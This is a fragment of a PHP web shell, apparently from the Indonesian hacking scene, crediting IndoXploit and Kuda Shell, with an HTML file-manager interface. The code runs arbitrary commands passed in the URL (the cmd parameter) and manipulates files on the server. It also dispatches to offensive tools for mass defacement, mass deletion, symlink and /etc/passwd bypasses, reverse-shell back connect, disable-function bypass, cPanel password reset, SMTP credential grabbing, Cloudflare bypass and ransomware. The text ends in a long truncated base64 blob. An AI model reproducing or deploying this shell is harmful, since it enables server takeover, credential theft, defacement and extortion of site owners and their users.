									<td>: '.$curl.'</td>
								</tr>
								<tr>
									<td>Mailer</td>
									<td>: '.$mail.'</td>
								</tr>
								<tr>
									<td>Disable Function</td>
									<td>: '.$show_ds.'</td>
								</tr>
								<tr>
									<td>Software</td>
									<td>: '.$sof.'</td>
								</tr>
								<tr>
									<td>Sistem Operasi</td>
									<td> : '.$os.'</td>
								</tr>
							</table>
						</div>
					</div><hr/>
				</div>
			<div class="col-md-7 mt-4">';
				//logout
				if (isset($_GET['logout'])){
					session_start();
					session_destroy();
					echo '<script>window.location="?";</script>';
				}
				//cmd
				if(isset($_GET['cmd'])){
					echo "<pre class='text-white'>".exe($_GET['cmd'])."</pre>";
					exit;
				}
				//about
				if (isset($_GET['about'])){
					about();
				}
				//upload
				if ($_GET['tool'] == 'upload'){
					toolUpload($dir);
				}
				//openfile
					if (isset($_GET['file'])){
					$file = $_GET['file'];
				}
				$nfile = basename($file);
				//chmod
				if($_GET['tool'] == 'chmod_file'){
					chmodFile($dir,$file,$nfile);
				}
				//New_file
				if ($_GET['tool'] == 'New_file'){
					NewFile($dir,$imgfile);
				}
				//view
				if($_GET['tool'] == 'view'){
					view($dir,$file,$nfile,$imgfile);
				}
				//edit
				if($_GET['tool'] == 'edit'){
					editFile($dir,$file,$nfile,$imgfile);
				}
				//rename
				if($_GET['tool'] == 'rename'){
					renameFile($dir,$file,$nfile,$imgfile);
				}
				//Delete File
				if ($_GET['tool'] == 'hapusf'){
					hapusFile($dir,$file,$nfile);
				}
				$ndir = basename($dir);
				//chmod
				if($_GET['tool'] == 'chmod_dir'){
					chmodFolder($dir,$ndir);
				}
				//Add Folder
				if ($_GET['tool'] == 'New_folder' ){
					NewFolder($dir,$imgfol);
				}
				//Rename Folder
				if ($_GET['tool'] == 'rename_folder' ){
					renameFolder($dir,$ndir,$imgfol);
				}
				//Delete Folder
				if ($_GET['tool'] == 'hapus_folder' ){
					deleteFolder($dir,$ndir);
				}
		
				/*
					* Fungsi_Tambahan
					*
					*
					* Mass Deface
					* IndoXploit
				*/
				if($_GET['tool'] == 'masdef'){
					toolMasdef($dir,$file,$imgfol,$imgfile);
				}
				/*
					* mass delete
					* IndoXploit
				*/
				if($_GET['tool'] == 'masdel'){
					toolMasdel($dir,$file,$imgfol,$imgfile);
				}
				/* 
					* Jumping
					* IndoXploit
				*/
				if($_GET['tool'] == 'jumping'){
					toolJump($dir,$file,$ip);
				}
				//Config
				if($_GET['tool'] == 'config'){
					toolConfig($dir,$file);
				}
				//Bypass etc/passwd
				if($_GET['tool'] == 'passwbypass'){
					toolBypasswd($dir,$file);
				}
				//Adminer
				if($_GET['tool'] == 'adminer'){
					toolAdminer($dir,$file);
				}
				//cgi
				if($_GET['tool'] == 'cgi'){
					toolcgi($dir,$file);
				}
				/*
					* Symlink
					* Kuda Shell
				*/
				if($_GET['tool'] == 'symlink'){
					toolSym($dir,$file);
				}
				if($_GET['tool'] == 'symread'){
					toolSymread($dir,$file);
				}
				if ($_GET['tool'] == 'sym_404'){
					sym404($dir,$file);
				}
				if ($_GET['tool'] == 'sym_bypas'){
					symBypass($dir,$file);
				}
				/*
					* Back Connect
					* Kuda Shell
				*/
				if($_GET['tool'] == 'bctools'){
					bcTool($dir,$file);
				}
				/*
					* Bypass Disable Function
					* Kuda Shell
				*/
				if($_GET['tool'] == 'disabfunc'){
					disabFunc($dir,$file);
				}
				/*
					* Auto Reset Cpanel
					* HSS -Fauzan-
				*/
				if ($_GET['tool'] == 'resetpasscp'){
					resetCp($dir);
				}
				/*
					* Auto Edit User
					* IndoXploit
				*/
				if($_GET['tool'] == 'auteduser'){
					autoEdit($dir,$file);
				}
				/*
					* Ransomware
					* From Github Repo
				*/
				if ($_GET['tool'] == 'ransom'){
					ransom($dir,$file);
				}
				/*
					* SMTP Grabber
					* IndoXploit
				*/
				if ($_GET['tool'] == 'smtpgrab'){
					scj($dir);
				}
				//Bypass Cloud Flare
				if ($_GET['tool'] == 'bypascf'){
					bypasscf();
				}
				/*
					* Zip Menu
					* HSS -Rizsyard-
				*/
				if($_GET['tool'] == 'zip_menu'){
					zipMenu($dir,$file);
				} 
	
				if(isset($_GET['path'])){
					$path = $_GET['path'];
					chdir($path);
				}else{
					$path = getcwd();
				}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
				echo "Path : ";
				foreach($paths as $id=>$pat){
					if($pat == '' && $id == 0){
						$a = true;
						echo '<a href="?dir=/">/</a>';
						continue;
					}
					if($pat == '') continue;
					echo '<a style="word-wrap:break-word;" href="?dir=';
					for($i=0;$i<=$id;$i++){
						echo "$paths[$i]";
						if($i != $id) echo "/";
					}
					echo '">'.$pat.'</a>/';
				}
				$scandir = scandir($path);
				echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
				echo '<div id="tab"><table class="text-white mt-1 table-hover table-responsive">
					<thead class="bg-info text-center">
						<th class="text-left">File/folder</th>
						<th>Size</th>
						<th>Last Modified</th>
						<th>Permission</th>
						<th>Action</th>
					</thead>';
			
					foreach($scandir as $dir){
						$dtime = date("d/m/y G:i", filemtime("$dir/$dirx"));
						/* cek jika ini berbentuk folder */
						/* cek jika nama folder karaker terlalu panjang */
						if (strlen($dir) > 18){
							$_dir = substr($dir, 0, 18)."...";
						}else{
							$_dir = $dir;
						}
						$_diir = $_dir;
						if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
				
						echo '<tr class="text-center">
							<td class="pinggir">'.$imgfol.' <a href="?dir='.$path.'/'.$dir.'">'.$_diir.'</a></td>
							<td>--</td>
							<td>'.$dtime.'</td>
							<td>
							<a href="?dir='.$path.'/'.$dir.'&tool=chmod_dir">
';
							if(is_writable($path.'/'.$dir)) echo '<font color="#00ff00">';
							elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
							echo perms($path.'/'.$dir);
							if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></a></td>
							<td><a title="Rename" class="badge badge-success" href="?dir='.$path.'/'.$dir.'&tool=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir='.$path.'/'.$dir.'&tool=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
							</td>
						</tr>';
					}

					foreach($scandir as $file){
						$ftime = date("d/m/y G:i", filemtime("$path/$file"));
						/* cek jika ini berbentuk file */
						if(!is_file($path.'/'.$file)) continue;
						echo '<tr class="text-center">
							<td class="pinggir"><img src="';

							/* set image berdasarkan extensi file */
							$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
							if($ext == "php"){
								echo 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOIQGmNgoOunfnV1PVBlQR5PHnpEU1m7MNHw&usqp=CAU"';
							}elseif ($ext == "html"){
								echo 'data:image/jpeg;base64,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